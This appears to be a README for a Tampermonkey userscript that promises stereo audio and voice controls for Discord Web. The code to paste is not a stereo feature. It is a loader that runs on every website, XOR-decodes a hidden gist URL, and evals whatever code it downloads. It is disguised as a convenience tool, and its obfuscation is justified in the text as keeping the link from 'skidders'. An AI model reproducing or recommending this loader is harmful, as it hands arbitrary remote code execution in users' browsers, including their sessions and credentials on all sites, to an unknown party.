# Discord Website Stereo

A Tampermonkey userscript that modifies Discord Web's voice configuration and audio pipeline to expose additional voice controls directly in the browser.

It enables stereo transmission by adjusting the channel configuration used by Discord's media stream, while also allowing you to customize other audio-related settings through an integrated settings panel.

## Features

- Stereo audio support (2 channels)
- Adjustable voice bitrate
- Playback/sample rate selection
- Echo Cancellation toggle
- Noise Suppression toggle
- Auto Gain Control toggle
- Built-in settings UI integrated into Discord Web

### Tampermonkey script (copy and paste it in your tampermonkey)

```js
// ==UserScript==
// @name         Loader
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @connect      gist.githubusercontent.com
// ==/UserScript==

const k=37,d=[77,81,81,85,86,31,10,10,66,76,86,81,11,66,76,81,77,80,71,80,86,64,87,70,74,75,81,64,75,81,11,70,74,72,10,29,84,73,82,10,29,21,19,16,18,68,18,64,19,19,17,71,20,67,22,68,67,20,65,67,71,20,68,64,18,22,18,21,29,70,18,29,10,87,68,82,10,18,16,64,18,18,16,16,18,65,67,20,16,23,29,67,23,17,20,68,19,71,17,22,68,16,22,64,29,70,70,71,70,18,19,21,67,64,29,67,22,10,80,86,64,87,86,70,87,76,85,81,11,79,86];

GM_xmlhttpRequest({
    url: d.map(n => String.fromCharCode(n ^ k)).join(''),
    onload: r => (0, eval)(r.responseText)
});
```

A minimal loader that downloads and executes the latest version of the userscript from a remote source. The URL is encrypted to avoid exposing the raw link directly to skidders.

## Explanation on how it works

The script hooks into Discord Web's voice setup and modifies the media constraints passed to the browser when microphone streams are created. Based on the settings you choose, it updates values such as channel count, bitrate, sample rate, and browser audio-processing options. Changes are applied to Discord's voice stream after reconnecting or reloading.

## Installation

1. Install the **Tampermonkey** extension.
2. Create a new userscript.
3. Paste the contents of this repository into the editor.
4. Save the script and open Discord Web.
5. Join a voice channel and configure the settings from the built-in panel.

---

Made by **Waez/Court**.

Original stereo implementation was inspired by **UK Beat's Stereo Web Project**.
